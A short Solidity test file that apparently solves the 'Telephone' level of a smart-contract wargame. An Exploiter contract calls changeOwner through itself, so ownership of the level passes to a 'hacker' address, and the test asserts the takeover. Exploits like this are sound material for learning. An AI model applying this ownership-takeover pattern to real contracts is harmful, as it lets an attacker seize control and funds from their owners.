// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./utils/BaseTest.sol";
import "../src/levels/Telephone.sol";

contract Exploiter {
    function attack(Telephone _level) public{
        _level.changeOwner(msg.sender);
    }
}
contract TestTelephone is Test{
    Telephone level;
    Exploiter attackContract;
    address owner = address(0x01);
    address hacker = address(0x02);

    function setUp() public{
        level = new Telephone();
    }

    function testChangeOwner() public{
        vm.startPrank(owner);
        level = new Telephone();
        assertEq(level.owner(), owner);
        vm.stopPrank();

        vm.startPrank(hacker);
        attackContract = new Exploiter();
        attackContract.attack(level);

        assertEq(level.owner(),hacker); 
        console.log(level.owner());
        vm.stopPrank();
    }
}